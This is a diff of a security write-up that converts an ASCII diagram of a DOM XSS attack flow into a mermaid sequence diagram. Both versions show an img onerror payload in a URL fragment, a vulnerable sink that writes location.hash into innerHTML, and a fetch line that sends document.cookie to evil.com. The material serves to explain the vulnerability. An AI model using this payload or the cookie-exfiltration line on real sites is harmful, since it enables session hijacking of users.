@@ -93,45 +93,22 @@ Upon clicking, the administrator authenticated normally via the IdP. The IdP red
 
 ## Custom ASCII Diagram: DOM XSS Data Flow Architecture
 
-```text
-=============================================================================
-                  DOM XSS EXPLOITATION WORKFLOW
-=============================================================================
+```mermaid
+sequenceDiagram
+    participant A as Attacker Delivery
+    participant V as Victim Interaction
+    participant S as Web Server
+    participant C as Client-Side Execution
+    participant E as Exfiltration
 
- [1. Attacker Delivery]
- +-------------------------+
- | Attacker Crafts Link:   |
- | http://site.com/#<img   |
- | src=x onerror=alert(1)> |
- +-------------------------+
-             |
-             v
- [2. Victim Interaction]
- +-------------------------+      [Network Boundary]
- | Victim Clicks Link      | ---------------------------> +------------------+
- | Browser sends GET       | (Fragment # is stripped)     | Web Server       |
- | Request to site.com     | <--------------------------- | Returns generic  |
- +-------------------------+   (Returns static HTML)      | static HTML page |
-             |                                            +------------------+
-             v
- [3. Client-Side Execution (The Vulnerability)]
- +---------------------------------------------------------------+
- | Browser parses HTML and executes attached JavaScript.         |
- | JS code reads Source: window.location.hash (Contains Payload) |
- |                                                               |
- |    var payload = window.location.hash.substring(1);           |
- |    document.getElementById('msg').innerHTML = payload;        |
- |                                                               |
- | Execution Sink hit! DOM mutates and executes the <img> tag.   |
- +---------------------------------------------------------------+
-             |
-             v
- [4. Exfiltration / Impact]
- +-------------------------+
- | Payload Executes!       |
- | fetch('http://evil.com',|
- | {body: document.cookie})|
- +-------------------------+
+    A->>V: Crafts Link:<br/>http://site.com/#<img src=x onerror=alert(1)>
+    V->>S: Victim Clicks Link<br/>Browser sends GET Request to site.com
+    Note right of V: (Fragment # is stripped)
+    S-->>V: Returns generic static HTML page
+    V->>C: Browser parses HTML and executes attached JavaScript.
+    Note over C: JS code reads Source: window.location.hash<br/>var payload = window.location.hash.substring(1);<br/>document.getElementById('msg').innerHTML = payload;
+    C->>E: Execution Sink hit! DOM mutates and executes the img tag.
+    Note over E: Payload Executes!<br/>fetch('http://evil.com', {body: document.cookie})
 ```
 
 ---
